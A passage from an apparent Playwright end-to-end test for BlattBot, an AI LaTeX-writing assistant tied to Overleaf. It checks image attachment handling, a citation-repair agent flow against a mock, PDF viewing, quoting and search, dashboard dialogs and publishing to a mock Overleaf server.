      (await page.locator('img[src*="/chat-image/"]').filter({ visible: true }).count()) === 1;
    // …and it landed in DATA_DIR, never the working tree: nothing image-shaped
    // may show up in the review diff that gets pushed to Overleaf.
    const diffAfterImage = (await (
      await afetch(`${apiBase}/projects/${mockProjectId}/diff`)
    ).json()) as { diff: string };
    const imgNoDiffOk =
      existsSync(join(dataDir, "chat-uploads", mockProjectId)) &&
      !diffAfterImage.diff.includes("chat-upload") &&
      !/\.png/i.test(diffAfterImage.diff);
    await shot("30l-image-restored");

    // ---- W10 hardening: drops, image-only sends, a failed upload ----------
    /**
     * Drop a file on the composer form the way the OS does. Returns whether
     * both handlers called preventDefault: if either does not, the browser
     * falls back to its default action and NAVIGATES the tab to the file,
     * unmounting the SPA (a streaming turn, its Stop button, the live diff).
     */
    const dropOnComposer = (f: { name: string; type: string; b64?: string }) =>
      page.evaluate((file) => {
        const area = [...document.querySelectorAll<HTMLTextAreaElement>("textarea")].find(
          (t) => t.offsetParent !== null && /Ask BlattBot|BlattBot is working/.test(t.placeholder ?? ""),
        );
        const form = area?.closest("form");
        if (!form) return { found: false, overPrevented: false, dropPrevented: false };
        const bytes = file.b64
          ? Uint8Array.from(atob(file.b64), (c) => c.charCodeAt(0))
          : new Uint8Array([0x25, 0x50, 0x44, 0x46]); // "%PDF"
        const dt = new DataTransfer();
        dt.items.add(new File([bytes], file.name, { type: file.type }));
        const over = new DragEvent("dragover", { dataTransfer: dt, bubbles: true, cancelable: true });
        form.dispatchEvent(over);
        const drop = new DragEvent("drop", { dataTransfer: dt, bubbles: true, cancelable: true });
        form.dispatchEvent(drop);
        return { found: true, overPrevented: over.defaultPrevented, dropPrevented: drop.defaultPrevented };
      }, f);

    const attachNotice = (pattern: RegExp) => leftPane().getByText(pattern).filter({ visible: true });

    // A dropped NON-image used to land silently: the hint appeared, the drop
    // "took", and nothing happened at all.
    const pdfDrop = await dropOnComposer({ name: "reviewer-notes.pdf", type: "application/pdf" });
    await attachNotice(/reviewer-notes\.pdf is not a PNG/).first().waitFor({ timeout: 10_000 });
    const dropRejectOk =
      pdfDrop.found &&
      pdfDrop.overPrevented &&
      pdfDrop.dropPrevented &&
      (await attachNotice(/reviewer-notes\.pdf is not a PNG/).count()) === 1;
    await shot("30m-drop-non-image");

    // A failed upload must not eat the message. The bytes are not a PNG, so
    // the server's sniffing rejects them after the composer already cleared.
    const failComposer = () => page.getByPlaceholder(/Ask BlattBot/).filter({ visible: true }).first();
    await failComposer().click();
    await dropOnComposer({ name: "renamed.png", type: "image/png" });
    await leftPane().getByAltText("renamed.png").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await failComposer().fill("A long question I do not want to retype.");
    await page.getByRole("button", { name: "Send", exact: true }).click();
    await attachNotice(/Image upload failed/).first().waitFor({ timeout: 20_000 });
    const uploadFailKeepsDraftOk =
      (await failComposer().inputValue()) === "A long question I do not want to retype." &&
      (await leftPane().getByAltText("renamed.png").filter({ visible: true }).count()) === 1;
    await shot("30n-upload-failed-draft-kept");
    // Clear the bad attachment and the draft before the next round.
    await leftPane().getByRole("button", { name: "Remove renamed.png" }).first().click();
    await failComposer().fill("");

    // An image with no words is a complete message: Send must be enabled and
    // the turn must actually run.
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const dt = new DataTransfer();
      dt.items.add(new File([bytes], "solo.png", { type: "image/png" }));
      const areas = [...document.querySelectorAll<HTMLTextAreaElement>("textarea")].filter(
        (t) => t.offsetParent !== null && (t.placeholder ?? "").includes("Ask BlattBot"),
      );
      areas[0].dispatchEvent(
        new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }),
      );
    }, PASTE_PNG_B64);
    await leftPane().getByAltText("solo.png").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    const sendButton = () => page.getByRole("button", { name: "Send", exact: true });
    const imageOnlyEnabledOk =
      (await failComposer().inputValue()) === "" && (await sendButton().isEnabled());
    const imagesBeforeSolo = askMock.images.length;
    const replies = () => leftPane().getByText(/Received 1 attached image/).filter({ visible: true });
    const repliesBefore = await replies().count();
    await sendButton().click();
    // The bubble appears optimistically — wait for the MODEL's answer instead.
    await replies().nth(repliesBefore).waitFor({ timeout: 20_000 });
    const imageOnlySentOk = askMock.images.length === imagesBeforeSolo + 1;
    await shot("30o-image-only-sent");
    // Idle again (Stop → Send) before the next round.
    await sendButton().waitFor({ timeout: 20_000 });

    // While a turn runs the drop must STILL be prevented (otherwise the tab
    // navigates away mid-stream) and must say why nothing was attached. The
    // pending question card is the stable "busy" state in this flow.
    await page.getByPlaceholder(/Ask BlattBot/).filter({ visible: true }).first().fill("One more pass, please.");
    await sendButton().click();
    const busySkip = () => leftPane().getByRole("button", { name: "Skip these questions" }).filter({ visible: true });
    await busySkip().first().waitFor({ timeout: 20_000 });
    const busyDrop = await dropOnComposer({ name: "while-busy.png", type: "image/png", b64: PASTE_PNG_B64 });
    await attachNotice(/Wait for the current turn/).first().waitFor({ timeout: 10_000 });
    const busyDropOk =
      busyDrop.found &&
      busyDrop.overPrevented &&
      busyDrop.dropPrevented &&
      // …and the page is still the app: a navigation would have unmounted it.
      (await busySkip().count()) === 1 &&
      (await leftPane().getByAltText("while-busy.png").count()) === 0;
    await shot("30p-drop-while-busy");
    await busySkip().first().click();
    await sendButton().waitFor({ timeout: 20_000 });

    // A staged attachment belongs to the project it was staged in. Chat is
    // never remounted on a switch (panes stay mounted so drafts and scroll
    // survive), so without an explicit reset a figure pasted into project A
    // would be uploaded into project B on the next send.
    const switchTarget = (await (
      await afetch(`${apiBase}/projects`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ local: true, name: "Switch Target" }),
      })
    ).json()) as { id: string };
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 15_000 });
    await page.evaluate((b64) => {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const dt = new DataTransfer();
      dt.items.add(new File([bytes], "stale.png", { type: "image/png" }));
      const areas = [...document.querySelectorAll<HTMLTextAreaElement>("textarea")].filter(
        (t) => t.offsetParent !== null && (t.placeholder ?? "").includes("Ask BlattBot"),
      );
      areas[0].dispatchEvent(
        new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }),
      );
    }, PASTE_PNG_B64);
    await page.getByAltText("stale.png").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await page.getByLabel("Switch project").selectOption(switchTarget.id);
    const switchDialog = page.getByRole("dialog", { name: "Unapproved changes" });
    if (await switchDialog.count()) {
      await switchDialog.getByRole("button", { name: "Switch project" }).click();
    }
    await page.getByAltText("stale.png").waitFor({ state: "detached", timeout: 10_000 }).catch(() => {});
    const attachmentsClearedOnSwitchOk = (await page.getByAltText("stale.png").count()) === 0;
    await shot("30q-attachments-cleared-on-switch");
    // Back to the project the rest of the flow works in, and drop the extra.
    await page.getByLabel("Switch project").selectOption(mockProjectId);
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 15_000 });
    await afetch(`${apiBase}/projects/${switchTarget.id}`, { method: "DELETE" });
    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 15_000 });

    // ---- Refs: a flagged citation offers an agentic repair ----
    // The audit itself talks to Crossref/OpenAlex, so seed its stored verdict
    // instead of reaching the network: the UI path under test is badge → fix
    // button → composed repair prompt → agent turn (served by the ask mock).
    const AUDIT_KEY = "vaswani2017attention";
    const seedAudit = (result: Record<string, unknown>) => {
      mkdirSync(join(dataDir, "papers"), { recursive: true });
      writeFileSync(
        join(dataDir, "papers", `${mockProjectId}.audit.json`),
        JSON.stringify({ at: new Date().toISOString(), results: { [AUDIT_KEY]: result } }),
      );
    };
    const anyFixButton = () =>
      page.getByRole("button", { name: /^Fix .* with the agent$/ }).filter({ visible: true });
    const openRefs = async () => {
      await page.reload();
      // Pane-agnostic: by this point the ask flow may have swapped the panes.
      await page.getByRole("tab", { name: "References", exact: true }).filter({ visible: true }).first().click();
      await page.getByRole("button", { name: AUDIT_KEY, exact: true }).filter({ visible: true }).waitFor({ timeout: 10_000 });
    };

    // A verified entry offers no repair…
    seedAudit({ status: "verified", url: "https://doi.org/10.5555/3295222.3295349" });
    await openRefs();
    const fixOnlyOnFlaggedOk = (await anyFixButton().count()) === 0;

    // …the same entry flagged as a mismatch does.
    seedAudit({
      status: "mismatch",
      detail: 'entry title "Attention is All You Need" vs Crossref "A Different Paper"',
      url: "https://doi.org/10.1093/comjnl/27.2.97",
    });
    await openRefs();
    const fixButton = () =>
      page.getByRole("button", { name: `Fix ${AUDIT_KEY} with the agent` }).filter({ visible: true });
    await fixButton().waitFor({ timeout: 10_000 });
    const auditBadgeOk =
      (await page.getByLabel(`Audit: title mismatch — ${AUDIT_KEY}`).filter({ visible: true }).count()) > 0;
    await shot("30g-refs-flagged");
    await fixButton().click();
    // The turn is served by the ask mock, which records the prompt it received.
    await page
      .getByText("Looking into that flagged reference now.")
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 20_000 });
    const fixPrompt = askMock.prompts.find((p) => p.includes("citation audit flagged")) ?? "";
    const fixPromptOk =
      fixPrompt.includes(`\\cite{${AUDIT_KEY}}`) &&
      fixPrompt.includes("sections/refs.bib") &&
      fixPrompt.includes("https://doi.org/10.1093/comjnl/27.2.97") &&
      /do not change its cite key/i.test(fixPrompt) &&
      /audit_citations/.test(fixPrompt);
    // Chat must be on screen — the user should see the turn they triggered.
    const fixChatVisibleOk =
      (await page.locator('[data-pane] [data-panel="chat"]').filter({ visible: true }).count()) > 0 ||
      (await page.getByText("Looking into that flagged reference now.").filter({ visible: true }).count()) > 0;
    await shot("30h-refs-fix-turn");

    // Back to the stock Claude backend for the rest of the flow.
    await afetch(`${apiBase}/settings`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ backend: "", openaiBaseUrl: "", openaiModel: "" }),
    });

    // ---- Opening the PDF tab auto-compiles, with a visible progress indicator ----
    await aside().getByRole("tab", { name: "PDF", exact: true }).click();
    let compilingSeen = false;
    let canvasesDuringCompile = -1;
    try {
      await page.getByText(/Compiling…/).filter({ visible: true }).first().waitFor({ timeout: 15_000 });
      compilingSeen = true;
      canvasesDuringCompile = await page.locator("canvas").count();
      await shot("31a-pdf-compiling");
    } catch {
      await shot("99-failure");
      console.log("--- body text at failure ---\n", await page.locator("body").innerText());
    }
    // …then the compiled PDF renders inline (no browser download).
    await page.locator("canvas").first().waitFor({ state: "visible", timeout: 120_000 });
    await page.waitForTimeout(1_500);
    const compilingCleared =
      (await page.getByText(/Compiling…/).filter({ visible: true }).count()) === 0;
    await shot("31-pdf");
    const canvases = await page.locator("canvas").count();

    await page.getByRole("button", { name: "Zoom in" }).click();
    await page.waitForTimeout(800);
    await shot("32-pdf-zoom");

    // ---- Dual panes: source on the left WHILE the PDF stays on the right ----
    await leftPane().getByRole("tab", { name: "Source", exact: true }).click();
    await leftPane().locator(".cm-content").first().waitFor({ state: "visible", timeout: 15_000 });
    const sideBySideOk =
      (await leftPane().locator(".cm-content").filter({ visible: true }).count()) > 0 &&
      (await aside().locator("canvas").filter({ visible: true }).count()) > 0;
    await shot("37-side-by-side");

    // Selecting the right pane's view on the left SWAPS the two panes.
    await leftPane().getByRole("tab", { name: "PDF", exact: true }).click();
    await leftPane().locator("canvas").first().waitFor({ state: "visible", timeout: 30_000 });
    const swapOk =
      (await leftPane().locator("canvas").filter({ visible: true }).count()) > 0 &&
      (await aside().locator(".cm-content").filter({ visible: true }).count()) > 0;
    await shot("38-swapped");

    // ---- PDF text layer: selectable, copyable text over the canvas ----
    // The left pane shows the PDF; page 1 carries a .textLayer with spans.
    await leftPane().locator(".textLayer span").first().waitFor({ timeout: 30_000 });
    const textLayerSpans = await leftPane().locator(".textLayer").first().locator("span").count();
    // A programmatic selection across the layer yields a non-empty string.
    const textLayerSelection = await page.evaluate(() => {
      const layer = document.querySelector('main[data-pane="left"] .textLayer');
      if (!layer) return "";
      const sel = window.getSelection()!;
      sel.removeAllRanges();
      const range = document.createRange();
      range.selectNodeContents(layer);
      sel.addRange(range);
      const text = sel.toString();
      sel.removeAllRanges();
      return text;
    });
    const textLayerSelectable = textLayerSelection.trim().length > 0;
    await shot("39-pdf-textlayer");

    // ---- Double-click a PDF word → jump to the .tex line in the Source ----
    // Park the right pane on Proof first so the jump has to activate Source.
    await aside().getByRole("tab", { name: "Proof", exact: false }).click();
    await page.getByText("No pending changes").filter({ visible: true }).first().waitFor({ timeout: 10_000 });
    await leftPane().locator(".textLayer span", { hasText: "Attention" }).first().dblclick();
    await aside().locator(".cm-flash-line").first().waitFor({ timeout: 10_000 });
    const dblclickSourceActive = await aside()
      .getByRole("tab", { name: "Source", exact: true })
      .evaluate((el) => el.className.includes("bg-ink-2"));
    const dblclickJumpOk =
      dblclickSourceActive &&
      (await aside().locator(".cm-content").first().innerText()).includes("Attention mechanisms");
    await shot("40-pdf-dblclick-jump");

    // ---- Quote a PDF selection into the chat composer ----
    // Layout for this: chat on the left, PDF on the right (the chip only
    // offers itself while the other pane shows the chat).
    await leftPane().getByRole("tab", { name: "Chat", exact: true }).click();
    await page.getByTitle("Switch chat").waitFor({ timeout: 5_000 });
    await aside().getByRole("tab", { name: "PDF", exact: true }).click();
    await aside().locator(".textLayer span").first().waitFor({ timeout: 60_000 });
    const quoteSelection = await page.evaluate(() => {
      const layer = document.querySelector('aside[data-pane="right"] .textLayer');
      if (!layer) return "";
      const spans = [...layer.querySelectorAll("span")].filter((s) => (s.textContent ?? "").trim());
      if (spans.length === 0) return "";
      const sel = window.getSelection()!;
      sel.removeAllRanges();
      const range = document.createRange();
      range.setStartBefore(spans[0]);
      range.setEndAfter(spans[Math.min(2, spans.length - 1)]);
      sel.addRange(range);
      layer.dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true }));
      return sel.toString();
    });
    const quoteChip = page.getByRole("button", { name: "❝ quote in chat" });
    await quoteChip.waitFor({ timeout: 5_000 });
    await shot("41-pdf-quote-chip");
    await quoteChip.click();
    const composer = page.getByPlaceholder(/Ask BlattBot/);
    // The injection flows through React state — poll instead of racing it.
    await page
      .waitForFunction(
        () => {
          const el = [...document.querySelectorAll("textarea")].find((t) =>
            t.placeholder.includes("Ask BlattBot"),
          );
          return Boolean(el && el.value.includes("(from the PDF)"));
        },
        { timeout: 5_000 },
      )
      .catch(() => {});
    const draftValue = await composer.inputValue();
    const quotedWords = quoteSelection.trim().split(/\s+/).slice(0, 3).join(" ");
    const quoteInDraftOk =
      quoteSelection.trim().length > 0 &&
      draftValue.includes("(from the PDF)") &&
      draftValue.startsWith("> \"") &&
      draftValue.includes(quotedWords);
    await shot("42-pdf-quote-draft");
    await composer.fill("");

    // Find-in-PDF: the panel searches the document's own text (the browser's
    // find only sees lazily-rendered pages), reporting a match count.
    await page.getByRole("button", { name: "Open find in PDF" }).filter({ visible: true }).first().click();
    const findInput = page.getByRole("textbox", { name: "Find in PDF" }).filter({ visible: true });
    await findInput.fill("Attention");
    let pdfSearchCount = "";
    await page
      .waitForFunction(
        () => {
          const el = [...document.querySelectorAll('[role="status"]')].find((n) =>
            /^\d+\/\d+$|^no hits$/.test((n.textContent ?? "").trim()),
          );
          return Boolean(el);
        },
        { timeout: 10_000 },
      )
      .catch(() => {});
    pdfSearchCount = (
      await page
        .locator('[role="status"]')
        .filter({ hasText: /^\d+\/\d+$|^no hits$/ })
        .first()
        .textContent()
    )?.trim() ?? "";
    const pdfSearchOk = /^\d+\/\d+$/.test(pdfSearchCount) && !pdfSearchCount.startsWith("0/");
    // A nonsense query must report no hits rather than a stale count.
    await findInput.fill("zzzqqxnotpresent");
    const pdfSearchMissOk = await page
      .locator('[role="status"]')
      .filter({ hasText: "no hits" })
      .first()
      .waitFor({ timeout: 10_000 })
      .then(() => true)
      .catch(() => false);
    await shot("42b-pdf-search");
    await page.getByRole("button", { name: "Close find" }).filter({ visible: true }).first().click();

    // A selection spanning TWO pages must offer the chip too: its common
    // ancestor sits above both text layers, which used to fail the test.
    // Text layers render lazily per visible page, so scroll to a page boundary
    // until two of them coexist — otherwise the case cannot occur in the DOM.
    for (let attempt = 0; attempt < 12; attempt++) {
      const layerCount = await page.locator('aside[data-pane="right"] .textLayer span').evaluateAll(
        (spans) => new Set(spans.map((s) => s.closest(".textLayer"))).size,
      );
      if (layerCount >= 2) break;
      await page.evaluate(() => {
        const el = document.querySelector('aside[data-pane="right"] [data-pdf-scroll]');
        if (el) el.scrollTop += el.clientHeight * 0.6;
      });
      await page.waitForTimeout(500);
    }
    const crossPageSelection = await page.evaluate(() => {
      const layers = [...document.querySelectorAll('aside[data-pane="right"] .textLayer')];
      if (layers.length < 2) return { spanned: false, text: "" };
      // No inner named functions here: tsx/esbuild would inject a __name helper
      // that does not exist in the page.
      const first = [...layers[0].querySelectorAll("span")].filter((s) => (s.textContent ?? "").trim());
      const second = [...layers[1].querySelectorAll("span")].filter((s) => (s.textContent ?? "").trim());
      if (first.length === 0 || second.length === 0) return { spanned: false, text: "" };
      const sel = window.getSelection()!;
      sel.removeAllRanges();
      const range = document.createRange();
      range.setStartBefore(first[Math.max(0, first.length - 4)]);
      range.setEndAfter(second[Math.min(2, second.length - 1)]);
      sel.addRange(range);
      layers[1].dispatchEvent(new MouseEvent("mouseup", { bubbles: true, cancelable: true }));
      return { spanned: true, text: sel.toString() };
    });
    let crossPageQuoteOk = true;
    let crossPageChipOk = true;
    if (crossPageSelection.spanned) {
      crossPageChipOk = await quoteChip
        .waitFor({ timeout: 5_000 })
        .then(() => true)
        .catch(() => false);
      crossPageQuoteOk = crossPageChipOk;
      if (crossPageQuoteOk) {
        await shot("42a-pdf-quote-crosspage");
        await quoteChip.click();
        // The injection flows through React state — poll instead of racing it.
        await page
          .waitForFunction(
            () => {
              const el = [...document.querySelectorAll("textarea")].find((t) =>
                t.placeholder.includes("Ask BlattBot"),
              );
              return Boolean(el && el.value.includes("(from the PDF)"));
            },
            { timeout: 5_000 },
          )
          .catch(() => {});
        const draft = await composer.inputValue();
        // Text from BOTH pages must survive into the draft.
        const head = crossPageSelection.text.trim().split(/\s+/).slice(0, 2).join(" ");
        const tail = crossPageSelection.text.trim().split(/\s+/).slice(-2).join(" ");
        crossPageQuoteOk = draft.includes("(from the PDF)") && (draft.includes(head) || draft.includes(tail));
        await composer.fill("");
      }
    }

    // Restore the layout the rest of the flow expects (chat left, source right).
    await aside().getByRole("tab", { name: "Source", exact: true }).click();
    await aside().locator(".cm-content").first().waitFor({ state: "visible", timeout: 15_000 });

    // Restore the chat on the left for the rest of the flow (right keeps source).
    await leftPane().getByRole("tab", { name: "Chat", exact: true }).click();
    await page.getByTitle("Switch chat").waitFor({ timeout: 5_000 });

    // ---- Back to the dashboard: create a standalone local project ----
    await page.getByRole("button", { name: "Back to dashboard" }).click();
    await page.getByRole("button", { name: "New blank project" }).waitFor({ timeout: 10_000 });
    await shot("33-dashboard-back");

    // The dashboard hub renders the imported project as a card in the grid.
    const cardGridOk =
      (await page.locator(".card-grid li").filter({ hasText: "Mock Thesis" }).count()) > 0;

    // Wordmark navigation: dashboard → project → dashboard.
    await page.getByRole("button", { name: "Open Mock Thesis" }).click();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page.getByRole("button", { name: "Back to the project dashboard" }).click();
    await page.locator(".card-grid").first().waitFor({ timeout: 10_000 });
    const wordmarkNavOk = (await page.locator(".card-grid").count()) > 0;
    await shot("33b-dashboard-cards");

    // ---- Remove-project opens the in-app confirm dialog (no native confirm) ----
    await page.locator(".card-grid li").filter({ hasText: "Mock Thesis" }).first().hover();
    await page.getByRole("button", { name: "Remove Mock Thesis" }).click();
    const confirmDialog = page.getByRole("dialog", { name: "Remove this project?" });
    await confirmDialog.waitFor({ timeout: 5_000 });
    // The custom dialog card: serif (Spectral) title, danger confirm in pencil.
    const dialogTitleSerif = await confirmDialog
      .locator("h2")
      .evaluate((el) => getComputedStyle(el).fontFamily.includes("Spectral"));
    const dialogDangerPencil = await confirmDialog
      .getByRole("button", { name: "Remove project" })
      .evaluate((el) => getComputedStyle(el).backgroundColor === "rgb(224, 101, 82)");
    await shot("33c-remove-dialog");
    // Cancel keeps the project (and the rest of the flow) intact.
    await confirmDialog.getByRole("button", { name: "Cancel" }).click();
    await confirmDialog.waitFor({ state: "detached", timeout: 5_000 });
    const customDialogOk =
      dialogTitleSerif &&
      dialogDangerPencil &&
      (await page.locator(".card-grid li").filter({ hasText: "Mock Thesis" }).count()) > 0;

    // ---- W7 a11y: Escape closes (cancels) the dialog and the project survives ----
    await page.locator(".card-grid li").filter({ hasText: "Mock Thesis" }).first().hover();
    await page.getByRole("button", { name: "Remove Mock Thesis" }).click();
    await confirmDialog.waitFor({ timeout: 5_000 });
    await page.keyboard.press("Escape");
    await confirmDialog.waitFor({ state: "detached", timeout: 5_000 });
    const dialogEscapeOk =
      (await page.locator(".card-grid li").filter({ hasText: "Mock Thesis" }).count()) > 0;

    await page.getByRole("button", { name: "New blank project" }).click();
    await page.getByPlaceholder("My new paper").fill("Scratch Note");
    await page.getByRole("button", { name: "Create project" }).click();

    // It opens straight into the project view with the seeded template files.
    await page.getByRole("checkbox", { name: "Scope main.tex" }).waitFor({ timeout: 15_000 });
    await page.getByRole("checkbox", { name: "Scope references.bib" }).waitFor({ timeout: 5_000 });
    await aside().getByRole("tab", { name: "Source", exact: true }).click();
    await page
      .getByText("Start writing here.")
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 10_000 });
    const localSource = await aside().innerText();
    const localFilesOk = localSource.includes("Scratch Note") && localSource.includes("references.bib");
    await shot("34-local-project");

    // ---- Publish the local project to the mock Overleaf account ----
    // (the wordmark is the other route back to the dashboard)
    await page.getByRole("button", { name: "Back to the project dashboard" }).click();
    const publishBtn = page.getByRole("button", { name: "Publish Scratch Note to Overleaf" });
    await publishBtn.waitFor({ timeout: 10_000 });
    await shot("35-dashboard-local");
    await publishBtn.click();
    await page.getByText(/Published to 127\.0\.0\.1/).waitFor({ timeout: 30_000 });
    await shot("36-published");

    // The mock actually received the project: template wiped, our files up.
    const created = mock.created[0];
    const publishOk =
      mock.created.length === 1 &&
      created.name === "Scratch Note" &&
      created.files.has("main.tex") &&
      created.files.has("references.bib") &&
      !created.files.has("sample.bib") &&
      (created.files.get("main.tex")?.toString() ?? "").includes("Scratch Note");

    // …and the published project now lists under the account as connected.
    const publishedRow = await page.getByRole("button", { name: /Scratch Note/ }).count();

    console.log(
      "checks:",
      JSON.stringify({
        accountOk,
        chatInitOk,
        chatHeaderOk,
        newChatOk,
        modelChipText,
        modelSavedOk,
        modelChipUpdated,
        modelResetOk,
        projSettingsSavedOk,
        projChipOverrideOk,
        projDefaultModeApplied,
        understandPillOk,
        projClearOk,
        restoreUserOk,
        restoreTitleOk,
        restoreDiffOk,
        restoreTurnEndOk,
        restoreMathOk,
        restoreResultHeadOk,
        deleteChatOk,
        sourceOk,
        cmGoldTokens,
        cmHighlightColors,
        editorTextOk,
        dirtyDotOk,
        quickSaveKeepsEditor,
        searchPanelOk,
        searchPanelStyled,
        acListsSection,
        acSectionInserted,
        acTabExit,
        acCiteDetail,
        acCiteInserted,
        acEnvPaired,
        acEnvEnterClose,
        acDollarPaired,
        acUndone,
        settingsOk,
        backendPickerOk,
        backendFieldsSwapOk,
        backendSwitchOk,
        askCardOk,
        askRestoredOk,
        askAnsweredOk,
        askCollapsedOk,
        askSkipEchoOk,
        askSkippedCollapsedOk,
        imgPasteThumbOk,
        imgRemoveOk,
        imgSentToModelOk,
        imgComposerClearedOk,
        imgBubbleOk,
        imgDialogOk,
        imgRestoredOk,
        imgNoDiffOk,
        dropRejectOk,
        uploadFailKeepsDraftOk,
        imageOnlyEnabledOk,
        imageOnlySentOk,
        busyDropOk,
        attachmentsClearedOnSwitchOk,
        auditBadgeOk,
        fixOnlyOnFlaggedOk,
        fixPromptOk,
        fixChatVisibleOk,
        mdStrongOk,
        mdMath,
        mdInlineMathOk,
        mdDisplayMathOk,
        mdNoRawOk,
        mdCodeLiteralOk,
        mdCurrencyOk,
        f1NoImgOk,
        f1ChipOk,
        f1JsLinkOk,
        f1NoRequestOk,
        f2PreservedOk,
        f2DisplayOk,
        f3IndentedOk,
        f4List,
        f4ListOk,
        linkRenderedOk,
        plainNonexistentOk,
        linkJumpOk,
        quoteActionOk,
        noPdfActionOk,
        quoteJumpOk,
        pdfFindOk,
        compilingSeen,
        canvasesDuringCompile,
        compilingCleared,
        canvases,
        downloads,
        widthBefore,
        widthAfter,
        scopeChipOk,
        scopeCleared,
        rejectFileUiOk,
        rejectFileContentOk,
        proofJumpOk,
        rejectHunkContentOk,
        leaveWarnShownOk,
        leaveWarnStayOk,
        leaveWarnLeaveOk,
        leaveUnloadArmedOk,
        leaveUnloadClearedOk,
        refChipLeaf,
        citeJumpOk,
        addProofOk,
        newChipGold,
        unusedBadgeOk,
        editProofOk,
        refsBibRestored,
        diffToggleOk,
        renderedChipsOk,
        renderedOnlyP3,
        renderedBoxesOk,
        renderedRestoredOk,
        localFilesOk,
        publishOk,
        publishedRow,
        sideBySideOk,
        swapOk,
        textLayerSpans,
        textLayerSelectable,
        dblclickJumpOk,
        quoteInDraftOk,
        sourceQuoteChipOk,
        sourceQuoteDraftOk,
        pdfSearchCount,
        pdfSearchOk,
        pdfSearchMissOk,
        crossPageSpanned: crossPageSelection.spanned,
        crossPageChipOk,
        crossPageQuoteOk,
        cardGridOk,
        wordmarkNavOk,
        customDialogOk,
        unofficialNoticeOk,
        tablistOk,
        reducedMotionOk,
        keyboardResizeOk,
        dialogEscapeOk,
      }),
    );
    if (!accountOk) throw new Error("Dashboard did not show the account email/host");
    if (!chatInitOk) throw new Error("opening the project did not create one active 'New chat'");
    if (!chatHeaderOk) throw new Error("chat header does not show 'New chat'");
    if (!newChatOk) throw new Error("'+ new chat' did not create and activate a second chat");
    if (modelChipText !== "sonnet-5") {
      throw new Error(`model chip shows '${modelChipText}' instead of the resolved default 'sonnet-5'`);
    }
    if (!modelSavedOk) throw new Error("picking a model in the popover did not save it to settings");
    if (!modelChipUpdated) throw new Error("model chip did not refresh to 'opus-5' after saving");
    if (!modelResetOk) throw new Error("resetting the model to the default failed");
    if (!projSettingsSavedOk) {
      throw new Error("project settings (style/model/defaultMode) did not persist via GET");
    }
    if (!projChipOverrideOk) {
      throw new Error("model chip does not show the project override 'fable-5'");
    }
    if (!projDefaultModeApplied) {
      throw new Error("the project's default mode did not preselect the Research pill");
    }
    if (!understandPillOk) {
      throw new Error("the chat composer's mode picker does not show the Understand pill");
    }
    if (!projClearOk) {
      throw new Error("clearing the project override failed (or dropped the style/defaultMode)");
    }
    if (!restoreUserOk) throw new Error("persisted user message did not render after reload");
    if (!restoreTitleOk) throw new Error("chat title was not derived from the first user message");
    if (!restoreDiffOk) throw new Error("restored tool chip did not expand to the persisted fileDiff");
    if (!restoreTurnEndOk) throw new Error("persisted turn_end marker did not render after reload");
    if (!restoreMathOk) {
      throw new Error("the restored transcript did not render its inline math through KaTeX");
    }
    if (!restoreResultHeadOk) {
      throw new Error("the restored Grep chip did not show its persisted resultHead sub-line");
    }
    if (!deleteChatOk) throw new Error("deleting the active chat did not fall back to the remaining one");
    if (!sourceOk) throw new Error("Source tab did not show the expected file content");
    if (cmGoldTokens < 1) throw new Error("CodeMirror showed no highlighted (gold) LaTeX command tokens while editing");
    if (cmHighlightColors.length < 3) {
      throw new Error(
        `LaTeX highlighting shows only ${cmHighlightColors.length} distinct colors beyond ` +
          `paper-dim/graphite (${cmHighlightColors.join(", ")}) — expected at least 3`,
      );
    }
    if (!editorTextOk) throw new Error("CodeMirror editor lost the typed content");
    if (!dirtyDotOk) throw new Error("unsaved draft did not show the gold dirty dot");
    if (!quickSaveKeepsEditor) {
      throw new Error("Ctrl+S did not keep the editor editable (typing after quick save did not re-dirty)");
    }
    if (!searchPanelOk) throw new Error("Ctrl+F did not open the CodeMirror search panel");
    if (!searchPanelStyled) throw new Error("search panel is not styled with the app theme (bg-ink-2)");
    if (!acListsSection) throw new Error("typing \\sec did not list \\section in the autocomplete tooltip");
    if (!acSectionInserted) {
      throw new Error("accepting \\section did not insert \\section{} with the cursor inside");
    }
    if (!acTabExit) throw new Error("Tab did not exit the snippet field past the closing brace");
    if (!acCiteDetail) throw new Error("\\cite{ did not offer the bib key with its title as detail");
    if (!acCiteInserted) throw new Error("accepting the cite completion did not insert the key");
    if (!acEnvPaired) {
      throw new Error("completing \\begin{itemi did not yield a paired \\end{itemize} (or left a stray brace)");
    }
    if (!acEnvEnterClose) {
      throw new Error("Enter after a hand-typed \\begin{...} did not auto-insert the matching \\end");
    }
    if (!acDollarPaired) throw new Error("$ did not auto-pair for inline math");
    if (!acUndone) throw new Error("Cancel did not restore the pre-autocomplete file state");
    if (!compilingSeen) throw new Error("switching to the PDF tab showed no Compiling… indicator");
    // The PDF pane is the default and compiles on project open, so a previous
    // PDF legitimately stays visible while a recompile runs.
    if (canvasesDuringCompile < 1) {
      throw new Error("no canvases visible during recompile — the previous PDF should stay rendered");
    }
    if (!compilingCleared) throw new Error("Compiling… indicator did not clear after the compile");
    if (!settingsOk) throw new Error("Settings transparency tab is missing prompt/tool info");
    if (!backendPickerOk) {
      throw new Error("Settings → Agent does not show the two backend radio cards with Claude preselected");
    }
    if (!backendFieldsSwapOk) {
      throw new Error("switching to the openai backend did not swap in its base URL/key/model fields");
    }
    if (!backendSwitchOk) {
      throw new Error("backend switching did not persist openai → claude → \"\" via GET /api/settings");
    }
    if (!askCardOk) {
